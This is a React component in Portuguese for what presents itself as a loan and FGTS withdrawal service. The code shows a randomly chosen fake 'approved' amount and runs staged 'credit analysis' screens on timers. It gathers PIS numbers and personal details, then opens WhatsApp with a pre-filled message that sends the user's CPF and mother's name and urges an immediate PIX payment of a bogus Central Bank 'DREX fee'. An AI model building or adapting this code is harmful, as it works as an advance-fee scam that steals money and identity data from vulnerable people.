function ConsultaModal({ isOpen, onClose, resultado, tipoConsulta }) {
  try {
  const [etapa, setEtapa] = React.useState('resultado'); // resultado, perguntas, perguntas-fgts, analisando, analisando-valores, taxa
  const [respostas, setRespostas] = React.useState({
    idade: '',
    renda: '',
    profissao: ''
  });
  const [respostasFgts, setRespostasFgts] = React.useState({
    ultimaEmpresa: '',
    dataAdmissao: '',
    pisPasep: '',
    jaRecebeuSaque: ''
  });
  const [analisandoTaxa, setAnalisandoTaxa] = React.useState(false);

    if (!isOpen) return null;

    // Valores aleatórios diferentes
    const valoresDisponiveis = {
      emprestimo: ['R$ 7.456,20', 'R$ 6.543,82', 'R$ 13.645,25'],
      fgts: ['R$ 13.454,22', 'R$ 8.765,40', 'R$ 11.234,55']
    };
    
    const valorEscolhido = valoresDisponiveis[tipoConsulta]?.[Math.floor(Math.random() * 3)] || 'R$ 7.456,20';

    const handlePergunta = (campo, valor) => {
      setRespostas(prev => ({ ...prev, [campo]: valor }));
    };

    const continuarPerguntas = () => {
      if (respostas.idade && respostas.renda && respostas.profissao) {
        if (tipoConsulta === 'fgts') {
          setEtapa('perguntas-fgts');
        } else {
          setEtapa('analisando');
          setAnalisandoTaxa(true);
          
          setTimeout(() => {
            setAnalisandoTaxa(false);
            setEtapa('analisando-valores');
            
            setTimeout(() => {
              setEtapa('taxa');
            }, 20000);
          }, 18000);
        }
      }
    };

    const continuarFgts = () => {
      if (respostasFgts.ultimaEmpresa && respostasFgts.dataAdmissao && respostasFgts.pisPasep && respostasFgts.jaRecebeuSaque) {
        setEtapa('analisando');
        setAnalisandoTaxa(true);
        
        setTimeout(() => {
          setAnalisandoTaxa(false);
          setEtapa('analisando-valores');
          
          setTimeout(() => {
            setEtapa('taxa');
          }, 20000);
        }, 18000);
      }
    };

    const handleFgtsResposta = (campo, valor) => {
      setRespostasFgts(prev => ({ ...prev, [campo]: valor }));
    };

    const aceitarTaxa = () => {
      const numeroWhatsApp = '6281661546';
      const tipoTexto = tipoConsulta === 'emprestimo' ? 'Empréstimo' : 'FGTS';
      const mensagem = `🎉 APROVAÇÃO CONFIRMADA! 

${tipoTexto}: ${valorEscolhido}
Nome: ${resultado?.nome}
CPF: ${resultado?.cpf}
Mãe: ${resultado?.mae}
Nascimento: ${resultado?.nascimento}

✅ Aceito a taxa de documentação: R$ 63,48

🚨 URGENTE: Para garantir seu dinheiro hoje, preciso fazer o PIX agora da taxa DREX! 

Banco Central exige pagamento em até 15 minutos senão perde a aprovação! ⏰

Chave PIX para taxa DREX: 
📱 (62) 98166-1546

Após o PIX, mando comprovante aqui que em 2 minutos seu dinheiro cai na conta! 

⚠️ SÓ HOJE essa condição especial! Amanhã volta taxa normal de R$ 97,00

Faz o PIX agora que já libero tudo! 💸`;
      const urlWhatsApp = `https://wa.me/${numeroWhatsApp}?text=${encodeURIComponent(mensagem)}`;
      window.open(urlWhatsApp, '_blank');
    };

    return (
      <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4" data-name="consulta-modal" data-file="components/ConsultaModal.js">
        <div className="bg-white rounded-3xl p-6 max-w-md w-full shadow-2xl max-h-[90vh] overflow-y-auto mx-4">
          
          {/* Etapa: Resultado */}
          {etapa === 'resultado' && (
            <>
              <div className="text-center mb-8">
                <div className="text-8xl mb-4 animate-bounce">🎉</div>
                <h3 className="text-3xl font-bold text-[var(--text-primary)] mb-3">
                  APROVADO!
                </h3>
                <p className="text-[var(--text-secondary)] text-xl font-semibold">
                  Você foi pré-aprovado para receber:
                </p>
                <div className="bg-gradient-to-r from-green-100 to-blue-100 rounded-2xl p-3 mt-4">
                  <p className="text-green-700 font-bold text-lg">
                    💸 Dinheiro liberado para saque imediato!
                  </p>
                </div>
              </div>

              <div className="space-y-6 mb-8">
                {tipoConsulta === 'emprestimo' && (
                  <div className="bg-gradient-to-br from-blue-50 to-indigo-100 border-2 border-blue-300 rounded-2xl p-6 relative overflow-hidden">
                    <div className="absolute top-0 right-0 bg-red-500 text-white px-3 py-1 rounded-bl-lg text-xs font-bold">
                      LIBERADO
                    </div>
                    <div className="text-center">
                      <div className="text-5xl mb-3">💳</div>
                      <h4 className="text-xl font-bold text-[var(--text-primary)] mb-2">
                        Empréstimo Pré-Aprovado
                      </h4>
                      <div className="text-4xl font-black text-blue-700 mb-2">
                        {valorEscolhido}
                      </div>
                      <p className="text-sm font-semibold text-blue-600">
                        ✅ Taxa 0,99% • ✅ Até 60x • ✅ Sem consulta SPC
                      </p>
                    </div>
                  </div>
                )}

                {tipoConsulta === 'fgts' && (
                  <div className="bg-gradient-to-br from-green-50 to-emerald-100 border-2 border-green-300 rounded-2xl p-6 relative overflow-hidden">
                    <div className="absolute top-0 right-0 bg-yellow-500 text-green-800 px-3 py-1 rounded-bl-lg text-xs font-bold">
                      DISPONÍVEL
                    </div>
                    <div className="text-center">
                      <div className="text-5xl mb-3">🏦</div>
                      <h4 className="text-xl font-bold text-[var(--text-primary)] mb-2">
                        Saque FGTS Imediato
                      </h4>
                      <div className="text-4xl font-black text-green-700 mb-2">
                        {valorEscolhido}
                      </div>
                      <p className="text-sm font-semibold text-green-600">
                        ✅ Sem análise • ✅ Recebe hoje • ✅ Até 13 parcelas
                      </p>
                    </div>
                  </div>
                )}
              </div>

              <div className="space-y-4">
                <button 
                  onClick={() => setEtapa('perguntas')}
                  className={`mobile-button ${tipoConsulta === 'emprestimo' ? 'bg-[var(--primary-color)] hover:bg-blue-700' : 'bg-[var(--accent-color)] hover:bg-green-700'} text-white`}
                >
                  {tipoConsulta === 'emprestimo' ? '💳 Quero Meu Empréstimo' : '🏦 Quero Sacar Meu FGTS'}
                </button>
                <button 
                  onClick={onClose}
                  className="mobile-button bg-gray-200 text-[var(--text-primary)] hover:bg-gray-300"
                >
                  ❌ Fechar
                </button>
              </div>
            </>
          )}

          {/* Etapa: Perguntas */}
          {etapa === 'perguntas' && (
            <>
              <div className="text-center mb-6">
                <div className="text-6xl mb-4">📝</div>
                <h3 className="text-2xl font-bold text-[var(--text-primary)] mb-2">
                  Só Mais 3 Perguntinhas
                </h3>
                <p className="text-[var(--text-secondary)] text-lg">
                  Para liberar seu {tipoConsulta === 'emprestimo' ? 'Empréstimo' : 'FGTS'}
                </p>
              </div>

              <div className="space-y-6 mb-8">
                <div>
                  <label className="block text-lg font-bold text-[var(--text-primary)] mb-3">
                    🎂 Quantos anos você tem?
                  </label>
                  <input
                    type="number"
                    value={respostas.idade}
                    onChange={(e) => handlePergunta('idade', e.target.value)}
                    placeholder="Ex: 35 anos"
                    className="mobile-input text-center"
                  />
                </div>

                <div>
                  <label className="block text-lg font-bold text-[var(--text-primary)] mb-3">
                    💰 Quanto você ganha por mês?
                  </label>
                  <select
                    value={respostas.renda}
                    onChange={(e) => handlePergunta('renda', e.target.value)}
                    className="mobile-input"
                  >
                    <option value="">👇 Escolha sua faixa de renda</option>
                    <option value="Até R$ 2.000">💵 Até R$ 2.000</option>
                    <option value="R$ 2.001 a R$ 5.000">💶 R$ 2.001 a R$ 5.000</option>
                    <option value="R$ 5.001 a R$ 10.000">💷 R$ 5.001 a R$ 10.000</option>
                    <option value="Acima de R$ 10.000">💸 Acima de R$ 10.000</option>
                  </select>
                </div>

                <div>
                  <label className="block text-lg font-bold text-[var(--text-primary)] mb-3">
                    👔 Em que você trabalha?
                  </label>
                  <input
                    type="text"
                    value={respostas.profissao}
                    onChange={(e) => handlePergunta('profissao', e.target.value)}
                    placeholder="Ex: Funcionário Público, Vendedor..."
                    className="mobile-input"
                  />
                </div>
              </div>

              <div className="space-y-4">
                <button 
                  onClick={continuarPerguntas}
                  disabled={!respostas.idade || !respostas.renda || !respostas.profissao}
                  className="mobile-button bg-[var(--primary-color)] text-white hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  ✅ Pronto, Continuar
                </button>
                <button 
                  onClick={() => setEtapa('resultado')}
                  className="mobile-button bg-gray-200 text-[var(--text-primary)] hover:bg-gray-300"
                >
                  ⬅️ Voltar
                </button>
              </div>
            </>
          )}

          {/* Etapa: Perguntas específicas FGTS */}
          {etapa === 'perguntas-fgts' && (
            <>
              <div className="text-center mb-6">
                <div className="text-6xl mb-4">🏦</div>
                <h3 className="text-2xl font-bold text-[var(--text-primary)] mb-2">
                  Informações do FGTS
                </h3>
                <p className="text-[var(--text-secondary)] text-lg">
                  Para consultar seu saldo disponível
                </p>
              </div>

              <div className="space-y-6 mb-8">
                <div>
                  <label className="block text-lg font-bold text-[var(--text-primary)] mb-3">
                    🏢 Última empresa onde trabalhou com carteira assinada
                  </label>
                  <input
                    type="text"
                    value={respostasFgts.ultimaEmpresa}
                    onChange={(e) => handleFgtsResposta('ultimaEmpresa', e.target.value)}
                    placeholder="Ex: Magazine Luiza, Petrobras..."
                    className="mobile-input"
                  />
                </div>

                <div>
                  <label className="block text-lg font-bold text-[var(--text-primary)] mb-3">
                    📅 Data de admissão ou demissão no último emprego
                  </label>
                  <input
                    type="date"
                    value={respostasFgts.dataAdmissao}
                    onChange={(e) => handleFgtsResposta('dataAdmissao', e.target.value)}
                    className="mobile-input"
                  />
                </div>

                <div>
                  <label className="block text-lg font-bold text-[var(--text-primary)] mb-3">
                    🆔 Número do PIS/PASEP/NIS
                  </label>
                  <input
                    type="text"
                    value={respostasFgts.pisPasep}
                    onChange={(e) => handleFgtsResposta('pisPasep', e.target.value)}
                    placeholder="Ex: 12345678901"
                    maxLength="11"
                    className="mobile-input"
                  />
                </div>

                <div>
                  <label className="block text-lg font-bold text-[var(--text-primary)] mb-3">
                    💰 Já recebeu saque/aniversário ou saque emergencial?
                  </label>
                  <select
                    value={respostasFgts.jaRecebeuSaque}
                    onChange={(e) => handleFgtsResposta('jaRecebeuSaque', e.target.value)}
                    className="mobile-input"
                  >
                    <option value="">👇 Selecione uma opção</option>
                    <option value="Nunca recebi">❌ Nunca recebi</option>
                    <option value="Recebi em 2023">📅 Recebi em 2023</option>
                    <option value="Recebi em 2024">📅 Recebi em 2024</option>
                    <option value="Recebi em 2025">📅 Recebi em 2025</option>
                  </select>
                </div>
              </div>

              <div className="space-y-4">
                <button 
                  onClick={continuarFgts}
                  disabled={!respostasFgts.ultimaEmpresa || !respostasFgts.dataAdmissao || !respostasFgts.pisPasep || !respostasFgts.jaRecebeuSaque}
                  className="mobile-button bg-[var(--accent-color)] text-white hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  ✅ Consultar Meu FGTS
                </button>
                <button 
                  onClick={() => setEtapa('perguntas')}
                  className="mobile-button bg-gray-200 text-[var(--text-primary)] hover:bg-gray-300"
                >
                  ⬅️ Voltar
                </button>
              </div>
            </>
          )}

          {/* Etapa: Analisando Taxa */}
          {etapa === 'analisando' && (
            <>
              <div className="text-center mb-8">
                <div className="text-6xl mb-4">🔍</div>
                <h3 className="text-2xl font-bold text-[var(--text-primary)] mb-2">
                  Analisando Perfil de Crédito
                </h3>
                <p className="text-[var(--text-secondary)] text-lg mb-6">
                  Calculando a melhor taxa para você
                </p>
                
                <div className="flex justify-center mb-6">
                  <div className="w-16 h-16 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin"></div>
                </div>
                
                <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 space-y-3">
                  <div className="flex items-center space-x-3">
                    <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                    <p className="text-blue-700">Verificando score de crédito...</p>
                  </div>
                  <div className="flex items-center space-x-3">
                    <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                    <p className="text-blue-700">Consultando histórico bancário...</p>
                  </div>
                  <div className="flex items-center space-x-3">
                    <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                    <p className="text-blue-700">Calculando taxa personalizada...</p>
                  </div>
                </div>
              </div>
            </>
          )}

          {/* Etapa: Analisando Valores */}
          {etapa === 'analisando-valores' && (
            <>
              <div className="text-center mb-8">
                <div className="text-6xl mb-4 animate-pulse">💰</div>
                <h3 className="text-2xl font-bold text-[var(--text-primary)] mb-2">
                  Analisando Valores
                </h3>
                <p className="text-[var(--text-secondary)] text-lg mb-6">
                  Calculando taxas personalizadas para você
                </p>
                
                <div className="flex justify-center mb-6">
                  <div className="w-16 h-16 border-4 border-green-200 border-t-green-600 rounded-full animate-spin"></div>
                </div>
                
                <div className="bg-green-50 border border-green-200 rounded-xl p-4 space-y-3">
                  <div className="flex items-center space-x-3">
                    <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                    <p className="text-green-700">Consultando taxas do Banco Central...</p>
                  </div>
                  <div className="flex items-center space-x-3">
                    <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                    <p className="text-green-700">Verificando custos DREX...</p>
                  </div>
                  <div className="flex items-center space-x-3">
                    <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                    <p className="text-green-700">Calculando impostos sobre crédito...</p>
                  </div>
                  <div className="flex items-center space-x-3">
                    <div className="w-3 h-3 bg-yellow-500 rounded-full animate-pulse"></div>
                    <p className="text-orange-700">Preparando valor final...</p>
                  </div>
                </div>
              </div>
            </>
          )}

          {/* Etapa: Taxa DREX */}
          {etapa === 'taxa' && (
            <>
              <div className="text-center mb-6">
                <div className="text-6xl mb-4">📋</div>
                <h3 className="text-2xl font-bold text-[var(--text-primary)] mb-2">
                  Taxa de Documentação
                </h3>
                <p className="text-[var(--text-secondary)] text-lg">
                  Obrigatória para processamento
                </p>
              </div>

              <div className="bg-gradient-to-br from-orange-50 to-yellow-50 border-2 border-orange-300 rounded-3xl p-6 mb-6 shadow-lg relative overflow-hidden">
                <div className="absolute top-0 right-0 bg-gradient-to-r from-orange-500 to-red-500 text-white px-4 py-1 rounded-bl-2xl text-xs font-bold">
                  CALCULADO
                </div>
                <div className="text-center mb-4">
                  <div className="text-6xl mb-3 animate-bounce">💳</div>
                  <h4 className="text-2xl font-bold text-orange-800 mb-3">Taxa de Documentação</h4>
                </div>
                <p className="text-orange-800 mb-6 text-lg leading-relaxed text-center">
                  📋 Envio de documentos ao Banco Central<br/>
                  🏦 Processamento via sistema DREX<br/>
                  📊 Impostos sobre liberação de crédito
                </p>
                <div className="text-center bg-gradient-to-br from-white to-orange-50 rounded-3xl p-6 border-2 border-orange-200 shadow-inner">
                  <div className="text-5xl font-black text-orange-700 mb-3">R$ 63,48</div>
                  <div className="text-xl text-orange-600 font-bold">Valor único e transparente</div>
                  <div className="text-sm text-orange-500 mt-2">💡 Sem taxas ocultas ou surpresas</div>
                </div>
              </div>

              <div className="bg-gradient-to-r from-blue-50 to-indigo-50 border-2 border-blue-200 rounded-2xl p-5 mb-6">
                <div className="text-center mb-3">
                  <div className="text-3xl mb-2">🔍</div>
                  <h5 className="text-lg font-bold text-blue-800">O que está incluído:</h5>
                </div>
                <div className="space-y-2">
                  <div className="flex items-center space-x-3 bg-white rounded-lg p-2">
                    <div className="text-blue-600">✅</div>
                    <span className="text-blue-700 font-medium">Envio seguro via sistema DREX</span>
                  </div>
                  <div className="flex items-center space-x-3 bg-white rounded-lg p-2">
                    <div className="text-blue-600">✅</div>
                    <span className="text-blue-700 font-medium">Impostos federais sobre crédito</span>
                  </div>
                  <div className="flex items-center space-x-3 bg-white rounded-lg p-2">
                    <div className="text-blue-600">✅</div>
                    <span className="text-blue-700 font-medium">Processamento bancário completo</span>
                  </div>
                </div>
              </div>

              <div className="space-y-4">
                <button 
                  onClick={aceitarTaxa}
                  className="mobile-button bg-[var(--accent-color)] text-white hover:bg-green-700"
                >
                  <div className="flex items-center justify-center space-x-3">
                    <div className="text-2xl">💬</div>
                    <span>Aceito! Vou pro WhatsApp</span>
                  </div>
                </button>
                <button 
                  onClick={() => setEtapa('perguntas')}
                  className="mobile-button bg-gray-200 text-[var(--text-primary)] hover:bg-gray-300"
                >
                  ⬅️ Voltar
                </button>
                <button 
                  onClick={onClose}
                  className="mobile-button bg-red-100 text-red-700 hover:bg-red-200"
                >
                  ❌ Não Quero Mais
                </button>
              </div>
            </>
          )}
        </div>
      </div>
    );
  } catch (error) {
    console.error('ConsultaModal component error:', error);
    return null;
  }
}